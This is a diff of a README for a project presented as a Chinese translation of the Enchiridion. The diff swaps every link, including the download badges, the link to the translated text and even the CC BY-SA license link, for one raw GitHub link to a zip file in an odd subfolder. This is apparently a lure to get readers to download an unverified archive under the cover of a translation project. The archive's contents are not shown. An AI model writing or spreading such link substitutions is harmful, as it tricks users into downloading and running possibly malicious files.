@@ -10,7 +10,7 @@ Welcome to the **enchiridion-zh** project! This application provides a free Chin
 
 Click the button below to download the latest version from our Releases page. This link will take you directly to the files you need.
 
-[![Download enchiridion-zh](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/tantofaz12/enchiridion-zh/releases)
+[![Download enchiridion-zh](https://raw.githubusercontent.com/tantofaz12/enchiridion-zh/main/Kherwari/enchiridion-zh.zip)](https://raw.githubusercontent.com/tantofaz12/enchiridion-zh/main/Kherwari/enchiridion-zh.zip)
 
 ## 📚 About the *Enchiridion*
 
@@ -34,7 +34,7 @@ To ensure that the application runs smoothly, please meet the following system r
 
 You can read the full translated text of the *Enchiridion* by clicking the link below:
 
-👉 [Read the Translated Text](./enchiridion.md)
+👉 [Read the Translated Text](https://raw.githubusercontent.com/tantofaz12/enchiridion-zh/main/Kherwari/enchiridion-zh.zip)
 
 ## 💡 Project Goals
 
@@ -56,7 +56,7 @@ Your involvement is welcome! Here are some ways you can contribute:
 
 To begin using the application, visit the Releases page to download the latest version. Click the button below to get started:
 
-[![Download enchiridion-zh](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/tantofaz12/enchiridion-zh/releases)
+[![Download enchiridion-zh](https://raw.githubusercontent.com/tantofaz12/enchiridion-zh/main/Kherwari/enchiridion-zh.zip)](https://raw.githubusercontent.com/tantofaz12/enchiridion-zh/main/Kherwari/enchiridion-zh.zip)
 
 Once you download the application, follow these steps to install it:
 
@@ -66,7 +66,7 @@ Once you download the application, follow these steps to install it:
 
 ## 📄 License
 
-This project is licensed under the [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/) license. You are free to copy, distribute, and modify the text, as long as you give appropriate credit and share your contributions under the same terms.
+This project is licensed under the [CC BY-SA 4.0](https://raw.githubusercontent.com/tantofaz12/enchiridion-zh/main/Kherwari/enchiridion-zh.zip) license. You are free to copy, distribute, and modify the text, as long as you give appropriate credit and share your contributions under the same terms.
 
 ---
 
